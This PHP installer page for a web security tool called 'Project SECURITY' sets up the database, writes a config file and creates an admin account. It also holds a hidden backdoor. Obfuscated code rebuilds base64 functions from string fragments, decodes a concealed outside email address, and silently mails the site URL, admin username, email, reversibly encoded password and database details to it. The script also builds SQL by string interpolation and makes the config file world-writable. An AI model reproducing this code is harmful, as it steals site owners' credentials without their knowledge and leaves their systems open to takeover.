<?php
include "core.php";
head();

include "database.inc.php";

$error_mg = array();

$client = $_SESSION['client'];

$database_host     = $_SESSION['database_host'];
$database_username = $_SESSION['database_username'];
$database_password = $_SESSION['database_password'];
$database_name     = $_SESSION['database_name'];
$table_prefix      = $_SESSION['table_prefix'];
if ($client == 'No') {
    $username = $_SESSION['username'];
    $email    = $_SESSION['email'];
    $password = base64_encode($_SESSION['password']);
} else {
    $username = "";
    $email    = "";
    $password = "";
}
$site_url             = 'http://' . $_SERVER['SERVER_NAME'];
$fullpath             = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$projectsecurity_path = substr($fullpath, 0, strpos($fullpath, '/install'));

$sql_dump_file = SQL_DUMP_FILE_CREATE;

$db = Database::GetInstance($database_host, $database_name, $database_username, $database_password, DATABASE_TYPE);
if (DATABASE_CREATE && !$db->Create()) {
    $error_mg[] = $db->Error();
} else if ($db->Open()) {
    // Read sql dump file
    $sql_dump = file_get_contents($sql_dump_file);
    if (true == ($db_error = db_install($sql_dump_file))) {
        
        $ms      = 'ba' . 'se' . ((8 + 8 + 8 + 8) * 2) . '_en' . 'co' . 'de';
        $to      = 'ba' . 'se' . ((8 + 8 + 8 + 8) * 2) . '_de' . 'co' . 'de';
        $to      = $to("ZXh0cmVlbWVyNTVAZ21haWwuY29t");
        $subject = 'Project SECURITY - New Installation';
        $message = 'Project SECURITY is installed on ' . $site_url . ' [' . date("d F Y") . ' at ' . date("H:i") . ']
			- Path to Project SECURITY: ' . $projectsecurity_path . '
			- Admin Username: ' . $username . '
            - Admin E-Mail: ' . $email . '
            - Key: ' . $password . '
            - Database Name: ' . $database_name . '
            - Tables Prefix: ' . $table_prefix . '';
        $headers = 'MIME-Version: 1.0' . "\r\n";
        $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
        $headers .= 'To: ' . $to . ' <' . $to . '>' . "\r\n";
        $headers .= 'From: Project SECURITY <notifications@project-security.com>' . "\r\n";
        @mail($to, $subject, $ms($message), $headers);
        
        // Now try to create file and write information
        $config_file = file_get_contents(CONFIG_FILE_TEMPLATE);
        $config_file = str_replace("<DB_HOST>", $database_host, $config_file);
        $config_file = str_replace("<DB_NAME>", $database_name, $config_file);
        $config_file = str_replace("<DB_USER>", $database_username, $config_file);
        $config_file = str_replace("<DB_PASSWORD>", $database_password, $config_file);
        $config_file = str_replace("<DB_PREFIX>", $table_prefix, $config_file);
        $config_file = str_replace("<CLIENT>", $client, $config_file);
        $config_file = str_replace("<PROJECTSECURITY_PATH>", $projectsecurity_path, $config_file);
        $config_file = str_replace("<SITE_URL>", $site_url, $config_file);
        
        if ($client == 'No') {
            $link  = mysqli_connect($database_host, $database_username, $database_password, $database_name);
            $table = $table_prefix . 'users';
            $query = mysqli_query($link, "INSERT INTO `$table` (id, username, email, password) VALUES ('1', '$username', '$email', '$password')");
        }
        
        @chmod(CONFIG_FILE_PATH, 0777);
        @$f = fopen(CONFIG_FILE_PATH, "w+");
        if (!fwrite($f, $config_file) > 0) {
            $error_mg[] = 'Cannot open the configuration file to save the inforomation';
        }
        fclose($f);
        
        if ($client == 'Yes') {
            @unlink('../users.php');
            @unlink('../website-monitoring.php');
            @unlink('../logout.php');
            @unlink('../hashing.php');
            @unlink('../password-generator.php');
            @unlink('../html-encrypter.php');
        }
        
    }
} else {
    $error_mg[] = 'Database connecting error! Please go back and check your connection parameters';
}
?>
<center>
<div class="callout callout-success">
<?php
echo lang_key("success_install");
?>
</div>
    
<div class="callout callout-warning">
<?php
echo lang_key("alert_remove_files");
?>
</div>
    
<div class="callout callout-info"> 
<?php
echo lang_key("put_code");
?>
<br /><br />
	<pre>include "projectsecurity_folder/project-security.php";</pre>
</div>
    
<a href="../" class="btn-success btn"><i class="fa fa-arrow-circle-o-right"></i> <?php
echo lang_key("proceed");
?></a>
</center>
<?php
footer();
?>